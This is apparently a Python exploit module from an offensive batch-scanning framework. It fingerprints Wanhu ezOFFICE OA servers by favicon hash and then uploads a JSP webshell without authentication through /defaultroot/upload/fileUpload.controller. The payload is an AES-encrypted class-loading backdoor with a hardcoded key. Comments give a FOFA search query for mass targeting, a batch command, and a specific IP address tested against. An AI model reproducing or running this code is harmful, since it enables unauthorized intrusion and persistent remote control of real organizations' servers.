# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-07 21:20

import hashlib
from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


# fofa: "app=\"万户网络-ezOFFICE\" && country=\"CN\""
# python batch.py -m exploit.web.OA.Wanhu.unauth_uploadfile -cs -fs "app=\"万户网络-ezOFFICE\" && country=\"CN\""

class Script(BaseScript):
    name = 'OA-WanHu'

    def __init__(self, target, pbar):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.UPLOADFILE
        # 编号
        self.bugNumber = ''
        # 来源
        self.refer = ''
        # 特定路径判断
        self.detectPathList = ['/favicon.ico']
        # exec
        self.execPathList = ['/defaultroot/upload/fileUpload.controller']
        # 进度条
        self.pbar = pbar
        # 相关信息
        self.info = ''
        self.favicon = ['fa1f01d0392d60663d8ce936fe06096a']

    async def detect(self):
        try:
            async with aiohttp.ClientSession() as session:
                for detectPath in self.detectPathList:
                    url = f'http://{self.target}{detectPath}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                    async with session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                        if response is not None:
                            text = await response.read()
                            await asyncio.sleep(2)
                            m1 = hashlib.md5()
                            m1.update(text)
                            theMD5 = m1.hexdigest()
                            for _ in self.favicon:
                                if _ == theMD5:
                                    self.flag = True
                                    tqdm.write(Fore.RED + '[{}] {}'.format('OA-WanHu Finger', url))
                                    return {'name': 'OA-WanHu Finger', 'url': url, 'software': 'OA-WanHu'}
        except Exception:
                return None

    async def exec(self):
        try:
            headers = self.headers.copy()
            headers.update({'Content-Type': 'multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0',
                            'Connection': 'Keep-Alive'})
            # 这里修改上传的webshell
            data = "--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0\r\nContent-Disposition: form-data; name=\"file\"; filename=\"chacha.jsp\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\n<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";/*......tas9er*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>\r\n--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--"
            async with aiohttp.ClientSession() as session:
                for execPath in self.execPathList:
                    url = f'http://{self.target}{execPath}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{execPath}'
                    async with session.post(url=url, data=data, headers=headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                        if response is not None:
                            text = await response.text()
                            print(text)
                            await asyncio.sleep(2)
                            if 'success' in text:
                                # /defaultroot/upload/html/chacha.jsp
                                tqdm.write(Fore.RED + '[{}] {}'.format('OA-WanHu UploadFile', url))
                                return {'name': 'OA-WanHu UploadFile', 'url': url, 'software': 'OA-WanHu'}
        except Exception:
            return None

    async def attack(self, semaphore):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        self.pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    pass
    # import requests
    # import hashlib

    # resp = requests.get('http://116.52.165.226:7001/favicon.ico', verify=False)
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    #     m1.update(resp.content)
    #     theMD5 = m1.hexdigest()
    #     print(theMD5)

    # semaphore = asyncio.Semaphore(500)
    # sc = Script('116.52.165.226:7001', 1)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack(semaphore))
